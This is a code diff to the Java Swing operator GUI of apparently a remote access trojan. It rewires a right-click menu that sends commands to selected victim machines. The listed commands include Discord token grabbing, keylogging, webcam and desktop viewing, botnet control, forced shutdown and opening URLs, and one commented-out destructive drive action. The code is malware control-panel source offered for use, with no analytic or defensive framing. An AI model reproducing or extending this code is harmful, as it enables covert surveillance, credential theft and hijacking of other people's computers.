@@ -7,6 +7,8 @@ import java.awt.event.ActionListener;
 import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
 import java.text.NumberFormat;
+import java.util.ArrayList;
+import java.util.List;
 
 import javax.swing.DefaultListModel;
 import javax.swing.JButton;
@@ -26,8 +28,9 @@ import javax.swing.text.NumberFormatter;
 
 import me.sebsb.ConnectedClient;
 import me.sebsb.Server;
-import me.sebsb.action.Action;
-import me.sebsb.action.ActionManager;
+import me.sebsb.utils.MessageType;
+import me.sebsb.utils.NetUtils;
+import me.sebsb.utils.Packet;
 
 public class GuiMain extends JFrame {
 
@@ -117,16 +120,82 @@ public class GuiMain extends JFrame {
 		setVisible(true);
 	}
 	
+	private GuiMessageBox messageBox;
+	private GuiBotnet botnet;
+	private GuiOpenURL openUrl;
+	
 	public void popupMenu() {
 		JPopupMenu jPopupMenu = new JPopupMenu();
-        jPopupMenu.add(createAction("Grab Token", Action.DISCORD));
-        jPopupMenu.add(createAction("Alt F4", Action.ALTF4));
-        jPopupMenu.add(createAction("Message Box", Action.MESSAGE_BOX));
-        jPopupMenu.add(createAction("Bot Net", Action.BOTNET));
-        jPopupMenu.add(createAction("Desktop Viewer", Action.DESKTOP));
-        jPopupMenu.add(createAction("Webcam Viewer", Action.WEBCAM));
-        jPopupMenu.add(createAction("Key Logger", Action.KEYLOGGER));
-        //jPopupMenu.add(createAction("Drive Fucker", Action.DRIVEFUCKER));
+        jPopupMenu.add(createAction("Grab Token", MessageType.DISCORD));
+        jPopupMenu.add(createAction("Alt F4", MessageType.ALTF4));
+        jPopupMenu.add(createAction("Message Box", MessageType.MESSAGE_BOX, new ActionListener() {
+
+			@Override
+			public void actionPerformed(ActionEvent arg0) {
+				if (messageBox == null) {
+					messageBox = new GuiMessageBox(clientList);
+				}
+				
+				messageBox.setVisible(true);
+			}
+        	
+        }));
+        jPopupMenu.add(createAction("Bot Net", MessageType.BOTNET, new ActionListener() {
+
+			@Override
+			public void actionPerformed(ActionEvent arg0) {
+				if (botnet == null) {
+					botnet = new GuiBotnet();
+				}
+				
+				botnet.setVisible(true);
+			}
+        	
+        }));
+        jPopupMenu.add(createAction("Desktop Viewer", MessageType.DESKTOP, new ActionListener() {
+
+			@Override
+			public void actionPerformed(ActionEvent arg0) {
+				for (ConnectedClient cc : clientList.getSelectedValuesList()) {
+					cc.openDesktopView();
+				}
+			}
+        	
+        }));
+        jPopupMenu.add(createAction("Webcam Viewer", MessageType.WEBCAM, new ActionListener() {
+
+			@Override
+			public void actionPerformed(ActionEvent arg0) {
+				for (ConnectedClient cc : clientList.getSelectedValuesList()) {
+					cc.openWebcamView();
+				}
+			}
+        	
+        }));
+        jPopupMenu.add(createAction("Key Logger", MessageType.KEYLOGGER, new ActionListener() {
+
+			@Override
+			public void actionPerformed(ActionEvent arg0) {
+				for (ConnectedClient cc : clientList.getSelectedValuesList()) {
+					cc.openKeyLogView();
+				}
+			}
+        	
+        }));
+        //jPopupMenu.add(createAction("Drive Fucker", MessageType.DRIVEFUCKER));
+        jPopupMenu.add(createAction("Shutdown", MessageType.SHUTDOWN));
+        jPopupMenu.add(createAction("Open URL", MessageType.OPEN_URL, new ActionListener() {
+
+			@Override
+			public void actionPerformed(ActionEvent arg0) {
+				if (openUrl == null) {
+					openUrl = new GuiOpenURL(clientList);
+				}
+				
+				openUrl.setVisible(true);
+			}
+        	
+        }));
         
         clientList.addMouseListener(new MouseAdapter() {
 			public void mousePressed(MouseEvent e)  {check(e);}
@@ -143,24 +212,50 @@ public class GuiMain extends JFrame {
 		clientList.setComponentPopupMenu(jPopupMenu);
 	}
 	
-	public JMenuItem createAction(String name, Action action) {
+	public JMenuItem createAction(String name, MessageType action) {
 		JMenuItem item = new JMenuItem(name);
 		item.addActionListener(new ActionListener() {   	 
 			public void actionPerformed(ActionEvent e) {
-				ActionManager.sendAction(action, clientList);
+				Packet packet = new Packet();
+				packet.action = action.getID();
+				for (ConnectedClient cc : clientList.getSelectedValuesList()) {
+					try {
+						NetUtils.sendMessage(packet, cc.getPrintWriter());
+					} catch (Exception e1) {
+						e1.printStackTrace();
+					}
+				}
 			}
 		});
+		return item;
+	}
+	
+	public JMenuItem createAction(String name, MessageType action, ActionListener listener) {
+		JMenuItem item = new JMenuItem(name);
+		item.addActionListener(listener);
 		return item;
 	}
 
 	public void updateInfo() {
 		label.setText("Port: " + this.port + " | Clients Connected: " + this.parent.getClients().size());
-		
-		this.model.removeAllElements();
+		List<ConnectedClient> list = new ArrayList<ConnectedClient>();
+		for(int i = 0; i< this.clientList.getModel().getSize();i++){
+			list.add(this.clientList.getModel().getElementAt(i));
+        }
 		int index = 0;
 		for (ConnectedClient c : this.parent.getClients()) {
-			this.model.add(index, c);
+			if (!list.contains(c)) {
+				this.model.add(index, c);
+			}
 			index++;
+		}
+		int count = 0;
+		for (ConnectedClient c : list) {
+			if (!this.parent.getClients().contains(c)) {
+				this.model.remove(count);
+				continue;
+			}
+			count++;
 		}
 	}
 }
